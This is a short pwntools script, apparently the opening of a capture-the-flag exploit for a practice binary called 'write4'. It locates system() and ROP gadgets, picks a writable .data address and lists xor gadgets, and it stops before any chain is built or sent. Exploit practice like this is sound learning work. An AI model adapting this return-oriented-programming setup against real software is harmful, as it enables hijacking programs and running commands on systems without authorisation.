from pwn import *

context(arch='amd64', os='linux')
binary_name = 'write4'
p = process('./'+binary_name)
elf =  ELF(binary_name)
rop =  ROP(elf)

system = elf.sym["system"] 
pop_r14_r15_ret = (rop.find_gadget(['pop r14', 'pop r15', 'ret']))[0] # 0x400890
pop_r15_ret =     (rop.find_gadget(['pop r15', 'ret']))[0] # 0x400892
pop_rdi =         (rop.find_gadget(['pop rdi', 'ret']))[0]

# .data start address
writable_memory = 0x601050
# 0x0000000000400855 : xor byte ptr [r10], r12b ; ret
# 0x0000000000400856 : xor byte ptr [rdx], ah ; ret

